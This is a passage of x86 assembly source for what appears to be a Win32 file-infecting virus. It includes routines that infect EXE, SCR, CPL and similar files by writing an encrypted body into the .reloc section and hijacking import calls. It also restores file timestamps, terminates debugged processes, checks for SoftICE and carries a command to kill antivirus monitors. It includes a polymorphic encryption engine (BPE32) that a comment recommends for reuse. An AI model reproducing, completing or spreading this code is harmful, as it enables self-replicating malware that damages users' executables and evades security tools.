	test eax, eax
	jne n1_db
n2_db:	call t_write				;quit if error
	jmp m_thrd
n1_db:	push 0
	push eax
	mov eax, 0
ddTerminateProcess = dword ptr $-4		;destroy debugged process :)
	call eax
	jmp t_write

mThread:pushad					;main IPC thread
	@SEH_SetupFrame 	;setup SEH frame
	call gtDelta				;get delta

m_thrd:	mov edx, 0				;get thread ID number
t_number = dword ptr $-4
	mov ecx, VLCB_WaitGet
	lea esi, [ebp + data_buffer - mgdelta]
	call get_set_VLCB			;wait for request
	dec ecx
	jecxz Quit				;quit
	dec ecx
	jecxz Check				;check file
	cmp ecx, 1
	je Infect				;check and infect file
	cmp ecx, 2
	je Debug1				;check for debugger
	cmp ecx, 3
	je Debug2				;check for SoftICE
	cmp ecx, 4
	je Monitor				;kill AV monitors
	
	push 0
	call [ebp + ddSleep - mgdelta]		;switch to next thread
	jmp m_thrd				;and again...

Quit:	call t_write				;write result
end_mThread:
	@SEH_RemoveFrame			;remove SEH frame
	popad					;restore all registers
	ret					;and quit from thread
t_write:xor ecx, ecx				;set result
	inc ecx
t_wr:	inc ecx
	mov dword ptr [esi.WFD_szAlternateFileName], ecx	;write it
	mov ecx, VLCB_SetWait			;set and wait
	mov edx, [ebp + t_number - mgdelta]	;this thread
	call get_set_VLCB			;IPC!
	ret
Check:	@SEH_SetupFrame 	;setup SEH frame
	call CheckFile				;check file
	jecxz err_sCheck			;quit if error
_c1_ok:	@SEH_RemoveFrame			;remove SEH frame
	call t_write				;write result
	jmp m_thrd				;and quit
err_sCheck:
	@SEH_RemoveFrame			;remove SEH frame
d_wr:	xor ecx, ecx
	call t_wr				;write result
	jmp m_thrd				;and quit

Infect:	@SEH_SetupFrame 		;setup SEH frame
	call InfectFile				;check and infect file
	jmp _c1_ok				;and quit

InfectFile:
	lea esi, [esi.WFD_szFileName]		;get filename
	pushad
	xor eax, eax
	push eax
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push eax
	push eax
	push GENERIC_READ or GENERIC_WRITE
	push esi
	mov eax, 0
ddCreateFileA = dword ptr $-4
	call eax				;open file
	inc eax
	je r_attr				;quit if error
	dec eax
	mov [ebp + hFile - mgdelta], eax	;save handle

	xor edx, edx
	push edx
	push edx
	push edx
	push PAGE_READWRITE
	push edx
	push eax
	mov eax, 0
ddCreateFileMappingA = dword ptr $-4
	call eax				;create file mapping
	xchg eax, ecx
	jecxz endCreateMapping			;quit if error
	mov [ebp + hMapFile - mgdelta], ecx	;save handle

	xor edx, edx
	push edx
	push edx
	push edx
	push FILE_MAP_WRITE
	push ecx
	mov eax, 0
ddMapViewOfFile = dword ptr $-4
	call eax				;map view of file
	xchg eax, ecx
	jecxz endMapFile			;quit if error
	mov [ebp + lpFile - mgdelta], ecx	;save base address
	jmp nOpen

endMapFile:
	push_LARGE_0				;store base address
lpFile = dword ptr $-4
	mov eax, 0
ddUnmapViewOfFile = dword ptr $-4
	call eax				;unmap view of file

endCreateMapping:
	push_LARGE_0				;store handle
hMapFile = dword ptr $-4
	call [ebp + ddCloseHandle - mgdelta]	;close file mapping

	lea eax, [ebp + data_buffer.WFD_ftLastWriteTime - mgdelta]
	push eax
	lea eax, [ebp + data_buffer.WFD_ftLastAccessTime - mgdelta]
	push eax
	lea eax, [ebp + data_buffer.WFD_ftCreationTime - mgdelta]
	push eax
	push dword ptr [ebp + hFile - mgdelta]
	mov eax, 0
ddSetFileTime = dword ptr $-4
	call eax				;set back file time

	push_LARGE_0				;store handle
hFile = dword ptr $-4
	call [ebp + ddCloseHandle - mgdelta]	;close file

r_attr:	push dword ptr [ebp + data_buffer - mgdelta]
	lea esi, [ebp + data_buffer.WFD_szFileName - mgdelta]
	push esi				;filename
	call [ebp + ddSetFileAttributesA - mgdelta]	;set back file attributes
	jmp c_error				;and quit

nOpen:	mov ebx, ecx
	cmp word ptr [ebx], IMAGE_DOS_SIGNATURE	;must be MZ
	jne endMapFile
	mov esi, [ebx.MZ_lfanew]
	add esi, ebx
	lodsd
	cmp eax, IMAGE_NT_SIGNATURE		;must be PE\0\0
	jne endMapFile
	cmp word ptr [esi.FH_Machine], IMAGE_FILE_MACHINE_I386	;must be 386+
	jne endMapFile
	mov ax, [esi.FH_Characteristics]
	test ax, IMAGE_FILE_EXECUTABLE_IMAGE	;must be executable
	je endMapFile
	test ax, IMAGE_FILE_DLL			;mustnt be DLL
	jne endMapFile
	test ax, IMAGE_FILE_SYSTEM		;mustnt be system file
	jne endMapFile
	mov al, byte ptr [esi.OH_Subsystem]
	test al, IMAGE_SUBSYSTEM_NATIVE		;and mustnt be driver (thanx GriYo !)
	jne endMapFile

	movzx ecx, word ptr [esi.FH_NumberOfSections]	;must be more than one section
	dec ecx
	test ecx, ecx
	je endMapFile
	imul eax, ecx, IMAGE_SIZEOF_SECTION_HEADER
	movzx edx, word ptr [esi.FH_SizeOfOptionalHeader]
	lea edi, [eax+edx+IMAGE_SIZEOF_FILE_HEADER]
	add edi, esi				;get to section header

	lea edx, [esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress-4]
	mov eax, [edx]
	test eax, eax
	je endMapFile				;quit if no relocs
	mov ecx, [edi.SH_VirtualAddress]
	cmp ecx, eax
	jne endMapFile				;is it .reloc section?
	cmp [edi.SH_SizeOfRawData], 1a00h
	jb endMapFile				;check if .reloc is big enough
	pushad
	xor eax, eax
	mov edi, edx
	stosd					;erase .reloc records
	stosd
	popad

	mov eax, ebx				;now we will try to
	xor ecx, ecx				;patch
it_patch:
	pushad					;one API call
	mov edx, dword ptr [ebp + crcpAPIs + ecx*4 - mgdelta]	;get CRC32
	test edx, edx
	jne c_patch
	popad
	jmp end_patch				;quit if end of record
c_patch:push dword ptr [edi.SH_VirtualAddress]	;patch address
	push edx				;CRC32
	mov [ebp + r2rp - mgdelta], eax		;infection stage
	call PatchIT				;try to patch API call
	mov [esp.Pushad_edx], eax		;save address
	test eax, eax
	popad
	jne end_patch				;quit if we got address
	inc ecx
	jmp it_patch				;API call not found, try another API

end_patch:
	mov eax, edx
	mov edx, [esi.NT_OptionalHeader.OH_ImageBase-4]	;get Image base
	mov [ebp + compressed + (ImgBase-decompressed) - mgdelta], edx	;save it
	lea edx, [ebp + compressed + (ddAPI-decompressed) - mgdelta]
	push dword ptr [edx]				;store prev. API call
	mov [edx], eax					;save new one
	pushad						;store all registers
	lea esi, [ebp + compressed+(VulcanoInit-decompressed) - mgdelta]
	mov edi, [edi.SH_PointerToRawData]
	add edi, ebx				;where to write body
	mov ecx, (decompressed-VulcanoInit+3)/4	;size of virus body
	call BPE32				;write morphed body to file!
	mov [esp.Pushad_eax], eax		;save size
	popad
	pop dword ptr [edx]			;restore API call
	or dword ptr [edi.SH_Characteristics], IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
						;set flags
	lea ecx, [edi.SH_VirtualSize]		;get virtual size
	add [ecx], eax				;correct it
	mov ecx, [esi.NT_OptionalHeader.OH_FileAlignment-4]
	xor edx, edx
	div ecx
	inc eax
	mul ecx
	mov edx, [edi.SH_SizeOfRawData]
	mov [edi.SH_SizeOfRawData], eax		;align SizeOfRawData
	test dword ptr [edi.SH_Characteristics], IMAGE_SCN_CNT_INITIALIZED_DATA
	je rs_ok
	sub eax, edx
	add [esi.NT_OptionalHeader.OH_SizeOfInitializedData-4], eax
						;update next field, if needed
rs_ok:	mov eax, [edi.SH_VirtualAddress]
	add eax, [edi.SH_VirtualSize]
	xor edx, edx
	mov ecx, [esi.NT_OptionalHeader.OH_SectionAlignment-4]
	div ecx
	inc eax
	mul ecx
	mov [esi.NT_OptionalHeader.OH_SizeOfImage-4], eax	;new SizeOfImage
	jmp endMapFile			;everything is ok, we can quit

CheckFile:
	pushad
	mov ebx, esi
	test [ebx.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
	jne c_error				;discard directory entries
	xor ecx, ecx
	cmp [ebx.WFD_nFileSizeHigh], ecx	;discard files >4GB
	jne c_error
	mov edi, [ebx.WFD_nFileSizeLow]
	cmp edi, 4000h				;discard small files
	jb c_error

	lea esi, [ebx.WFD_szFileName]		;get filename
	push esi
endf:	lodsb
	cmp al, '.'				;search for dot
	jne endf	
	dec esi
	lodsd					;get filename extension
	or eax, 20202020h			;make it lowercase
	not eax					;mask it
	pop esi
	cmp eax, not 'exe.'			;is it EXE?
	je extOK
	cmp eax, not 'rcs.'			;is it SCR?
	je extOK
	cmp eax, not 'xfs.'			;is it SFX?
	je extOK
	cmp eax, not 'lpc.'			;is it CPL?
	je extOK
	cmp eax, not 'tad.'			;is it DAT?
	je extOK
	cmp eax, not 'kab.'			;is it BAK?
	je extOK
	xor ecx, ecx
	inc ecx
c_error:mov [esp.Pushad_ecx], ecx		;save result
	popad
	ret
extOK:	push FILE_ATTRIBUTE_NORMAL		;normal file
	push esi				;filename
	mov eax, 0
ddSetFileAttributesA = dword ptr $-4
	call eax				;blank file attributes
	xchg eax, ecx
	jmp c_error


get_set_VLCB:		;get/set VLCB records procedure (IPC)
			;input:	ECX	  -	0=set/wait else wait/get
			;	ESI	  -	pointer to data, if ECX!=0
			;	EBX	  -	ID number of request
			;	EDX	  -	-1, if random thread, otherwise
			;		  -	number of thread.
			;output:ECX	  -	if input ECX!=0, ECX=ID
			;		  -	if error, ECX=-1
			;	EDX	  -	if ECX!=0, number of thread
			;	ESI	  -	ptr to data, if input ECX=0
	mov edi, 0
vlcbBase = dword ptr $-4
	inc edx
	je t_rnd				;get random record
	dec edx
	imul eax, edx, VLCB_TSize-8
	add edi, eax
	jecxz sw_VLCB
	cmp dword ptr [edi.VLCB_TSep.VLCB_THandle], 0
	je qq
	call w_wait				;wait for free mutex
	pushad
	xchg esi, edi
	lea esi, [esi.VLCB_TSep.VLCB_TData]
	mov ecx, (VLCB_TSize-8)/4
	rep movsd				;copy data
	popad
	mov ecx, [edi.VLCB_TSep.VLCB_TID]	;get ID
	push ecx
	call r_mutex				;release mutex
	pop ecx
	ret					;and quit
t_next:	add edi, VLCB_TSize-8			;move to next record
	inc edx
	loop tsrch
qqq:	pop ecx
qq:	xor ecx, ecx
	dec ecx
	ret
t_rnd:	push ecx				;pass thru 20 records
	push 20
	pop ecx
	xor edx, edx
tsrch:	cmp dword ptr [edi.VLCB_TSep.VLCB_THandle], 0
	je t_next				;check if its free
	pop ecx
sw_VLCB:call w_wait				;wait for free mutex
	pushad
	lea edi, [edi.VLCB_TSep.VLCB_TData]
	mov ecx, (VLCB_TSize-8)/4
	rep movsd				;copy data
	popad
	mov [edi.VLCB_TSep.VLCB_TID], ebx
	pushad
	lea esi, [edi.VLCB_TSep.VLCB_TData.WFD_szAlternateFileName]
	mov ebp, [esi]				;get result
	call r_mutex				;signalize mutex
slp:	call sleep				;switch to next thread
	cmp [esi], ebp				;check for change
	je slp					;no change, wait
	popad
	xor ecx, ecx
	ret					;quit
w_wait:	call open_mutex				;open mutex
	push eax
	push 10000				;wait 10 seconds
	push eax
	mov eax, 0
ddWaitForSingleObject = dword ptr $-4
	call eax
	test eax, eax
	pop eax
	jne qqq					;quit if not signalized
	call close_mutex			;close mutex
	ret					;and quit
open_mutex:
	lea eax, [edi.VLCB_TSep.VLCB_THandle]	;name of mutex
	push eax
	push 0
	push 0f0000h or 100000h or 1		;access flags
	mov eax, 0
ddOpenMutexA = dword ptr $-4			;open mutex
	call eax
	ret
r_mutex:call open_mutex				;open mutex
	push eax
	push eax
	mov eax, 0
ddReleaseMutex = dword ptr $-4
	call eax				;singalize mutex
	pop eax
close_mutex:
	push eax
	mov eax, 0
ddCloseHandle = dword ptr $-4
	call eax				;close mutex
	ret
sleep:	push 0					;switch to next thread
	mov eax, 0
ddSleep = dword ptr $-4
	call eax				;switch!
	ret


Check&Infect:
	pushad
	mov esi, ebx				;get ptr to data
	pushad
	call vlcb_stuph				;common stuph
	mov ebx, VLCB_Check			;check only
	call get_set_VLCB			;IPC!
	inc ecx
	popad
	je _ret_				;quit if error
	mov eax, dword ptr [esi.WFD_szAlternateFileName]
	dec eax
	test eax, eax
	je _ret_
sc1_ok:	call vlcb_stuph				;common stuph
	mov ebx, VLCB_Infect			;check and infect
	call get_set_VLCB			;IPC!
_ret_:	popad
	ret

CRC32:	push ecx				;procedure to calculate	CRC32
	push edx
	push ebx       
        xor ecx, ecx   
        dec ecx        
        mov edx, ecx   
NextByteCRC:           
        xor eax, eax   
        xor ebx, ebx   
        lodsb          
        xor al, cl     
	mov cl, ch
	mov ch, dl
	mov dl, dh
	mov dh, 8
NextBitCRC:
	shr bx, 1
	rcr ax, 1
	jnc NoCRC
	xor ax, 08320h
	xor bx, 0edb8h
NoCRC:  dec dh
	jnz NextBitCRC
	xor ecx, eax
	xor edx, ebx
        dec edi
	jne NextByteCRC
	not edx
	not ecx
	pop ebx
	mov eax, edx
	rol eax, 16
	mov ax, cx
	pop edx
	pop ecx
	ret


SearchET:		;procedure for recieving API names from Export table
	pushad					;save all registers
	@SEH_SetupFrame 	;setup SEH frame
	mov edi, [eax.MZ_lfanew]		;get ptr to PE header
	add edi, eax				;make pointer raw
	mov ecx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
	jecxz address_not_found			;quit, if no exports
	mov ebx, eax
	add ebx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	mov edx, eax				;get RVA to Export table
	add edx, [ebx.ED_AddressOfNames]	;offset to names
	mov ecx, [ebx.ED_NumberOfNames]		;number of name
	mov edi, esi
	push edi
	xchg eax, ebp
	xor eax, eax
APIname:push eax
	mov esi, ebp
	add esi, [edx+eax*4]			;get to API name
	push esi
	@endsz					;get to the end of API name
	sub esi, [esp]				;get size of API name
	mov edi, esi				;to EDI
	pop esi					;restore ptr to API name
	call CRC32				;get its CRC32
	mov edi, [esp+4]			;get requested CRC32
	cmp eax, [edi]				;is it same
	pop eax
	je mcrc					;yeah
nchar:	inc eax					;no, increment counter
	loop APIname				;and get next API name
	pop eax					;clean stack
address_not_found:
	xor eax, eax				;and quit
	jmp endGPA
mcrc:	pop edx
	mov edx, ebp
	add edx, [ebx.ED_AddressOfOrdinals]	;skip over ordinals
	movzx eax, word ptr [edx+eax*2]
	cmp eax, [ebx.ED_NumberOfFunctions]
	jae address_not_found
	mov edx, ebp
	add edx, [ebx.ED_AddressOfFunctions]	;get start of function addresses
	add ebp, [edx+eax*4]			;make it pointer to our API
	xchg eax, ebp				;address to EAX
endGPA:	@SEH_RemoveFrame			;remove SEH frame
	mov [esp.Pushad_eax], eax		;store address
	popad					;restore all registers
	ret					;and quit


a_go:	inc esi					;jump over alignments
	inc esi
	pushad					;store all registers
	xor edx, edx				;zero EDX
	xchg eax, esi
	push 2
	pop ecx
	div ecx
	test edx, edx
	je end_align				;no alignments needed
	inc eax					;align API name
end_align:
	mul ecx
	mov [esp.Pushad_esi], eax
	popad					;restore all registers
	ret


PatchIT	Proc				;procedure for patching API calls
	pushad					;store all registers
	@SEH_SetupFrame 		;setup SEH frame
	call itDlta
itDelta:db	0b8h
itDlta:	pop ebp
	mov [ebp + gmh - itDelta], eax		;save it
	mov ebx, [eax.MZ_lfanew]		;get to PE header
	add ebx, eax				;make pointer raw
	push dword ptr [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
	call rva2raw
	pop edx
	sub edx, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	push edi
n_dll:	pop edi
	add edx, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	lea edi, [ebp + szK32 - itDelta]	;get Kernel32 name
	mov esi, [edx]
	test esi, esi
	je endPIT
sdll:	push dword ptr [edx.ID_Name]
	call rva2raw
	pop esi
	push edi
	cmpsd					;is it K32?
	jne n_dll
	cmpsd
	jne n_dll
	cmpsd
	jne n_dll
	pop edi
	xor ecx, ecx				;zero counter
	push dword ptr [edx.ID_OriginalFirstThunk]	;get first record
	call rva2raw
	pop esi
	push dword ptr [esi]			;get first API name
	call rva2raw
	pop esi
pit_align:
	call a_go
	push esi				;store pointer
	@endsz					;get to the end of API name
	mov edi, esi
	sub edi, [esp]				;move size of API name to EDI
	pop esi					;restore pointer
	push eax				;store EAX
	call CRC32				;calculate CRC32 of API name
	cmp eax, [esp.cPushad+10h]		;check, if it is requested API
	je a_ok					;yeah, it is
	inc ecx
	mov eax, [esi]				;check, if there is next API
	test eax, eax				;...
	pop eax					;restore EAX
	jne pit_align				;yeah, check it
	jmp endPIT				;no, quit
a_ok:	pop eax					;restore EAX
	push dword ptr [edx.ID_FirstThunk]	;get address to IAT
	call rva2raw
	pop edx
	mov eax, [edx+ecx*4]			;get address
	mov [esp.Pushad_eax+8], eax		;and save it to stack
	pushad					;store all registers
	mov eax, 0				;get base address of program
gmh = dword ptr $-4
	mov ebx, [eax.MZ_lfanew]
	add ebx, eax				;get PE header

	push dword ptr [ebx.NT_OptionalHeader.OH_BaseOfCode]	;get base of code
	call rva2raw				;normalize
	pop esi					;to ESI
	mov ecx, [ebx.NT_OptionalHeader.OH_SizeOfCode]	;and its size
	pushad
	call p_var
	dd	?
p_var:	push PAGE_EXECUTE_READWRITE
	push ecx
	push esi
	mov eax, 0
ddVirtualProtect = dword ptr $-4
	call eax				;set writable right
	test eax, eax
	popad
	je endPIT
sJMP:	mov dl, [esi]				;get byte from code
	inc esi
	cmp dl, 0ffh				;is it JMP/CALL?
	jne lJMP		                ;check, if it is          
	cmp byte ptr [esi], 25h                 ;JMP DWORD PTR [XXXXXXXXh]
	je gIT1                                                            
	cmp byte ptr [esi], 15h			;or CALL DWORD PTR [XXXXXXXXh]
	jne lJMP
	mov dl, 0e8h
	jmp gIT2
gIT1:	mov dl, 0e9h
gIT2:	mov [ebp + j_or_c - itDelta], dl	;change opcode
	mov edi, [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
	add edi, [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_Size]
	push ecx
	mov ecx, [ebx.NT_OptionalHeader.OH_ImageBase]
	add edi, ecx
	push ebp
	mov ebp, [esi+1]
	sub ebp, ecx
	push ebp
	call rva2raw
	pop ebp
	sub ebp, eax
	add ebp, ecx
	sub edi, ebp
	pop ebp
	pop ecx
	js lJMP				;check, if it is correct address
	push ecx
	push edx				;store EDX
	mov edx, [esp.Pushad_ecx+8]		;get counter
	imul edx, 4				;multiply it by 4
	add edx, [esp.Pushad_edx+8]		;add address to IAT to ptr
	sub edx, eax
	mov ecx, [esi+1]
	sub ecx, [ebx.NT_OptionalHeader.OH_ImageBase]
	push ecx
	call rva2raw
	pop ecx
	sub ecx, eax
	cmp edx, ecx				;is it current address
	pop edx
	pop ecx					;restore EDX
	jne sJMP				;no, get next address
	mov eax, [esi+1]
	mov [esp.cPushad.Pushad_eax+8], eax	;store register to stack
	mov [esp.Pushad_esi], esi		;for l8r use
	popad					;restore all registers

	mov byte ptr [esi-1], 0e9h		;build JMP or CALL
j_or_c = byte ptr $-1
	mov ebx, [esi+1]
	mov eax, [esp.cPushad+10h]		;get address
	add eax, [ebp + gmh - itDelta]
	sub eax, esi				;- current address
	sub eax, 4				;+1-5
	mov [esi], eax				;store built jmp instruction
	mov byte ptr [esi+4], 90h
	xchg eax, ebx
	jmp endIT				;and quit
lJMP:	dec ecx
	jecxz endPIT-1
	jmp sJMP				;search in a loop
	popad					;restore all registers
endPIT:	xor eax, eax
	mov [esp.Pushad_eax+8], eax
endIT:	@SEH_RemoveFrame			;remove SEH frame
	popad					;restore all registers
	ret 8					;and quit
PatchIT	EndP

rva2raw:pushad			;procedure for converting RVAs to RAW pointers
	mov ecx, 0				;0 if actual program
r2rp = dword ptr $-4
	jecxz nr2r
	mov edx, [esp.cPushad+4]		;no comments needed :)
	movzx ecx, word ptr [ebx.NT_FileHeader.FH_NumberOfSections]
	movzx esi, word ptr [ebx.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea esi, [esi+ebx+IMAGE_SIZEOF_FILE_HEADER+4]
n_r2r:	mov edi, [esi.SH_VirtualAddress]
	add edi, [esi.SH_VirtualSize]
	cmp edx, edi
	jb c_r2r
	add esi, IMAGE_SIZEOF_SECTION_HEADER
	loop n_r2r
	popad
	ret
nr2r:	add [esp.cPushad+4], eax
	popad
	ret
c_r2r:	add eax, [esi.SH_PointerToRawData]
	add eax, edx
	sub eax, [esi.SH_VirtualAddress]
	mov [esp.cPushad+4], eax
	popad
	ret


NewThread:					;thread starts here
	pushad					;store all registers
	@SEH_SetupFrame 
	mov ebp, [esp+2ch]			;get delta parameter
	xor ecx, ecx				;zero ECX
	and dword ptr [ebp + r2rp - gdelta], 0
g_hook:	mov eax, [ebp + newHookers + ecx*4 - gdelta]	;take address to hooker
	test eax, eax				;is it 0?
	je q_hook				;yeah, quit
	add eax, ebp
	sub eax, [ebp + GMHA - gdelta]
	push eax				;store address
	push dword ptr [ebp + crchAPIs + ecx*4 - gdelta]	;store CRC32
	mov eax, 0
GMHA = dword ptr $-4
	call PatchIT				;and patch Import Table
	mov esi, [ebp + oldHookers + ecx*4 - gdelta]
	add esi, ebp
	mov [esi], eax				;save old hooker
	inc ecx					;increment counter
	jmp g_hook				;loop
q_hook:	@SEH_RemoveFrame
	popad					;restore all registers
	ret					;and terminate thread


;BPE32 (Benny's Polymorphic Engine for Win32) starts here. U can find first
;version of BPE32 in DDT#1 e-zine. But unfortunately, how it usualy goes,
;there were TWO, REALLY SILLY/TINY bugs. I found them and corrected them. So,
;if u wanna use BPE32 in your code, use this version, not that version from
;DDT#1. Very BIG sorry to everyone, who had/has/will have problems with it.
;I also included there SALC opcode as a junk instruction.

BPE32   Proc
	pushad					;save all regs
	push edi				;save these regs for l8r use
	push ecx				;	...
	mov edx, edi				;	...
	push esi				;preserve this reg
	call rjunk				;generate random junk instructions
	pop esi					;restore it
	mov al, 0e8h				;create CALL instruction
	stosb					;	...
	mov eax, ecx				;	...
	imul eax, 4				;	...
	stosd					;	...

	mov eax, edx				;calculate size of CALL+junx
	sub edx, edi				;	...
	neg edx					;	...
	add edx, eax				;	...
	push edx				;save it

	push 0					;get random number
	call random				;	...
	xchg edx, eax
	mov [ebp + xor_key - mgdelta], edx	;use it as xor constant
	push 0					;get random number
	call random				;	...
	xchg ebx, eax
	mov [ebp + key_inc - mgdelta], ebx	;use it as key increment constant
x_loop:	lodsd					;load DWORD
	xor eax, edx				;encrypt it
	stosd					;store encrypted DWORD
	add edx, ebx				;increment key
	loop x_loop				;next DWORD

	call rjunk				;generate junx

	mov eax, 0006e860h			;generate SEH handler
	stosd					;	...
	mov eax, 648b0000h			;	...
	stosd					;	...
	mov eax, 0ceb0824h			;	...
	stosd					;	...

greg0:	call get_reg				;get random register
	cmp al, 5				;MUST NOT be EBP register
	je greg0
	mov bl, al				;store register
	mov dl, 11				;proc parameter (do not generate MOV)
	call make_xor				;create XOR or SUB instruction
	inc edx					;destroy parameter
	mov al, 64h				;generate FS:
	stosb					;store it
	mov eax, 896430ffh			;next SEH instructions
	or ah, bl				;change register
	stosd					;store them
	mov al, 20h				;	...
	add al, bl				;	...
	stosb					;	...

	push 2					;get random number
	call random
	test eax, eax
	je _byte_
	mov al, 0feh				;generate INC DWORD PTR
	jmp _dw_
_byte_:	mov al, 0ffh				;generate INC BYTE PTR
_dw_:	stosb					;store it
	mov al, bl				;store register
	stosb					;	...
	mov al, 0ebh				;generate JUMP SHORT
	stosb					;	...
	mov al, -24d				;generate jump to start of code (trick
        stosb                                   ;for better emulators, e.g. NODICE32)

	call rjunk				;generate junx
greg1:	call get_reg				;generate random register
	cmp al, 5				;MUST NOT be EBP
	je greg1
	mov bl, al				;store it

	call make_xor				;generate XOR,SUB reg, reg or MOV reg, 0

	mov al, 64h				;next SEH instructions
	stosb					;	...
	mov al, 8fh				;	...
	stosb					;	...
	mov al, bl				;	...
	stosb					;	...
	mov al, 58h				;	...
	add al, bl				;	...
	stosb					;	...

	mov al, 0e8h				;generate CALL
	stosb					;	...
	xor eax, eax				;	...
	stosd					;	...
	push edi				;store for l8r use
	call rjunk				;call junk generator

	call get_reg				;random register
	mov bl, al				;store it
	push 1					;random number (0-1)
	call random				;	...
	test eax, eax
	jne next_delta

	mov al, 8bh				;generate MOV reg, [ESP]; POP EAX
	stosb
	mov al, 80h
	or al, bl
	rol al, 3
	stosb
	mov al, 24h
	stosb
	mov al, 58h
	jmp bdelta

next_delta:
	mov al, bl				;generate POP reg; SUB reg, ...
	add al, 58h
bdelta:	stosb
	mov al, 81h
	stosb
	mov al, 0e8h
	add al, bl
	stosb
	pop eax
	stosd
	call rjunk				;random junx

	xor bh, bh				;parameter (first execution only)
	call greg2				;generate MOV sourcereg, ...
	mov al, 3				;generate ADD sourcereg, deltaoffset
	stosb					;	...
	mov al, 18h				;	...
	or al, bh				;	...
	rol al, 3				;	...
	or al, bl				;	...
	stosb					;	...
	mov esi, ebx				;store EBX
	call greg2				;generate MOV countreg, ...
	mov cl, bh				;store count register
	mov ebx, esi				;restore EBX

	call greg3				;generate MOV keyreg, ...
	push edi				;store this position for jump to decryptor
	mov al, 31h				;generate XOR [sourcereg], keyreg
	stosb					;	...
	mov al, ch				;	...
	rol al, 3				;	...
	or al, bh				;	...
	stosb					;	...

	push 6					;this stuff will choose ordinary of calls
	call random				;to code generators
	test eax, eax
	je g5					;GREG4 - key incremention
	cmp al, 1				;GREG5 - source incremention
	je g1					;GREG6 - count decremention
	cmp al, 2				;GREG7 - decryption loop
	je g2
	cmp al, 3
	je g3
	cmp al, 4
	je g4

g0:	call gg1
	call greg6
	jmp g_end
g1:	call gg2
	call greg5
	jmp g_end
g2:	call greg5
	call gg2
	jmp g_end
g3:	call greg5
gg3:	call greg6
	jmp g_out
g4:	call greg6
	call gg1
	jmp g_end
g5:	call greg6
	call greg5
g_out:	call greg4
g_end:	call greg7
	mov al, 61h				;generate POPAD instruction
	stosb					;	...
	call rjunk				;junk instruction generator
	mov al, 0c3h				;RET instruction
	stosb					;	...
	pop eax					;calculate size of decryptor and encrypted data
	sub eax, edi				;	...
	neg eax					;	...
	mov [esp.Pushad_eax], eax		;store it to EAX register
	popad					;restore all regs
	ret					;and thats all folx
get_reg proc					;this procedure generates random register
	push 8					;random number (0-7)
	call random				;	...
	test eax, eax
	je get_reg				;MUST NOT be 0 (=EAX is used as junk register)
	cmp al, 100b				;MUST NOT be ESP
	je get_reg
	ret
get_reg endp
make_xor proc					;this procedure will generate instruction, that
	push 3					;will nulify register (BL as parameter)
	call random
	test eax, eax
	je _sub_
	cmp al, 1
	je _mov_
	mov al, 33h				;generate XOR reg, reg
	jmp _xor_
_sub_:	mov al, 2bh				;generate SUB reg, reg
_xor_:	stosb
	mov al, 18h
	or al, bl
	rol al, 3
	or al, bl
	stosb
	ret
_mov_:	cmp dl, 11				;generate MOV reg, 0
	je make_xor
	mov al, 0b8h
	add al, bl
	stosb
	xor eax, eax
	stosd
	ret
make_xor endp
gg1:	call greg4
	jmp greg5
gg2:	call greg4
	jmp greg6

random	proc					;this procedure will generate random number
						;in range from 0 to pushed_parameter-1
						;0 = do not truncate result
	push edx				;save EDX
        RDTCS					;RDTCS instruction - reads PCs tix and stores
						;number of them into pair EDX:EAX
	xor edx, edx				;nulify EDX, we need only EAX
	cmp [esp+8], edx			;is parameter==0 ?
	je r_out				;yeah, do not truncate result
	div dword ptr [esp+8]			;divide it
	xchg eax, edx				;remainder as result
r_out:	pop edx					;restore EDX
	ret Pshd				;quit procedure and destroy pushed parameter
random	endp
make_xor2 proc					;create XOR instruction
	mov al, 81h
	stosb
	mov al, 0f0h
	add al, bh
	stosb
	ret
make_xor2 endp

greg2	proc					;1 parameter = source/count value
	call get_reg				;get register
	cmp al, bl				;already used ?
	je greg2
	cmp al, 5
	je greg2
	cmp al, bh
	je greg2
	mov bh, al

	mov ecx, [esp+4]			;get parameter
	push 5					;choose instructions
	call random
	test eax, eax
	je s_next0
	cmp al, 1
	je s_next1
	cmp al, 2
	je s_next2
	cmp al, 3
	je s_next3

	mov al, 0b8h				;MOV reg, random_value
	add al, bh				;XOR reg, value
	stosb					;param = random_value xor value
	push 0
	call random
	xor ecx, eax
	stosd
	call make_xor2
	mov eax, ecx
	jmp n_end2
s_next0:mov al, 68h				;PUSH random_value
	stosb					;POP reg
	push 0					;XOR reg, value
	call random				;result = random_value xor value
	xchg eax, ecx
	xor eax, ecx
	stosd
	mov al, 58h
	add al, bh
	stosb
	call make_xor2
	xchg eax, ecx
	jmp n_end2
s_next1:mov al, 0b8h				;MOV EAX, random_value
	stosb					;MOV reg, EAX
	push 0					;SUB reg, value
	call random				;result = random_value - value
	stosd
	push eax
	mov al, 8bh
	stosb
	mov al, 18h
	or al, bh
	rol al, 3
	stosb
	mov al, 81h
	stosb
	mov al, 0e8h
	add al, bh
	stosb
	pop eax
	sub eax, ecx
	jmp n_end2
s_next2:push ebx				;XOR reg, reg
	mov bl, bh				;XOR reg, random_value
	call make_xor				;ADD reg, value
	pop ebx					;result = random_value + value
	call make_xor2
	push 0
	call random
	sub ecx, eax
	stosd
	push ecx
	call s_lbl
	pop eax
	jmp n_end2
s_lbl:	mov al, 81h				;create ADD reg, ... instruction
	stosb
	mov al, 0c0h
	add al, bh
	stosb
	ret
s_next3:push ebx				;XOR reg, reg
	mov bl, bh				;ADD reg, random_value
	call make_xor				;XOR reg, value
	pop ebx					;result = random_value xor value
	push 0
	call random
	push eax
	xor eax, ecx
	xchg eax, ecx
	call s_lbl
	xchg eax, ecx
	stosd
	call make_xor2
	pop eax	
n_end2:	stosd
	push esi
	call rjunk
	pop esi
	ret Pshd
greg2	endp

greg3	proc
	call get_reg				;get register
	cmp al, 5				;already used ?
	je greg3
	cmp al, bl
	je greg3
